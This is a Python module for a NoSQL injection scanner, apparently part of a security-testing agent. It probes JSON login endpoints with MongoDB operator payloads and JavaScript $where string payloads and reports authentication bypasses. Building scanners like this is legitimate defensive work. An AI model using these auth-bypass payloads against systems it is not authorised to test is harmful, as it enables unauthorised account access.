"""NoSQL Injection Tester.

Detects NoSQL injection vulnerabilities (MongoDB/CouchDB) via operator injection
and JavaScript $where injection, using differential response analysis.

MAJ-4 (2026-07-23): accepts an optional ``client`` param so the scan runs
through a governed httpx client (scope/rate/header) when supplied by the
agent. When ``None`` a raw client is built (historical behavior).
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

import httpx

NOSQL_OPERATOR_PAYLOADS = [
    {"$gt": ""},
    {"$ne": None},
    {"$ne": "invalid_value_999"},
    {"$regex": ".*"},
]

NOSQL_STRING_PAYLOADS = [
    "' || '1'=='1",
    "admin' || '1'=='1",
    "true, $where: '1 == 1'",
    "'; return true; var dummy='",
]


@dataclass
class NoSQLFinding:
    param: str
    payload: Any
    target_url: str
    technique: str  # operator_injection | where_injection
    confirmed: bool
    evidence: Dict[str, Any] = field(default_factory=dict)


class NoSQLTester:
    """Test JSON APIs and query parameters for NoSQL injection vulnerabilities."""

    def __init__(self, timeout_seconds: float = 10.0):
        self.timeout_seconds = timeout_seconds

    async def scan_json_endpoint(
        self,
        target_url: str,
        json_body: Optional[Dict[str, Any]] = None,
        method: str = "POST",
        client: Optional[httpx.AsyncClient] = None,
    ) -> List[NoSQLFinding]:
        """Scan a JSON POST endpoint for NoSQL injection.

        MAJ-4 (2026-07-23): when ``client`` is supplied (governed), probes
        run through it. When ``None`` a raw client is built.
        """
        findings: List[NoSQLFinding] = []
        body = json_body or {"username": "admin", "password": "password"}

        if client is not None:
            return await self._scan(client, target_url, body, method, findings)
        async with httpx.AsyncClient(timeout=self.timeout_seconds, follow_redirects=False) as owned:
            return await self._scan(owned, target_url, body, method, findings)

    async def _scan(
        self,
        client: httpx.AsyncClient,
        target_url: str,
        body: Dict[str, Any],
        method: str,
        findings: List[NoSQLFinding],
    ) -> List[NoSQLFinding]:
        """Run the NoSQL injection probes against a given client."""
        # 1. Baseline request
        try:
            if method.upper() == "POST":
                base_resp = await client.post(target_url, json=body)
            else:
                base_resp = await client.get(target_url)
            base_status = base_resp.status_code
        except Exception:
            return []

        # 2. Test each key in json_body with operator payloads
        for key in list(body.keys()):
            for op_payload in NOSQL_OPERATOR_PAYLOADS:
                mutated_body = dict(body)
                mutated_body[key] = op_payload

                try:
                    resp = await client.post(target_url, json=mutated_body)
                    # Detection: If baseline failed (401/403/404) but NoSQL payload succeeded (200)
                    # or returned significantly different auth status / body content
                    if base_status in (401, 403, 404) and resp.status_code == 200:
                        findings.append(
                            NoSQLFinding(
                                param=key,
                                payload=op_payload,
                                target_url=target_url,
                                technique="operator_injection",
                                confirmed=True,
                                evidence={
                                    "param": key,
                                    "payload": op_payload,
                                    "baseline_status": base_status,
                                    "injected_status": resp.status_code,
                                    "response_snippet": resp.text[:300],
                                },
                            )
                        )
                        break
                    elif (
                        resp.status_code == 200
                        and ("token" in resp.text.lower() or "success" in resp.text.lower())
                        and ("token" not in base_resp.text.lower())
                    ):
                        findings.append(
                            NoSQLFinding(
                                param=key,
                                payload=op_payload,
                                target_url=target_url,
                                technique="operator_injection",
                                confirmed=True,
                                evidence={
                                    "param": key,
                                    "payload": op_payload,
                                    "baseline_status": base_status,
                                    "injected_status": resp.status_code,
                                    "response_snippet": resp.text[:300],
                                },
                            )
                        )
                        break
                except Exception:
                    continue

        return findings
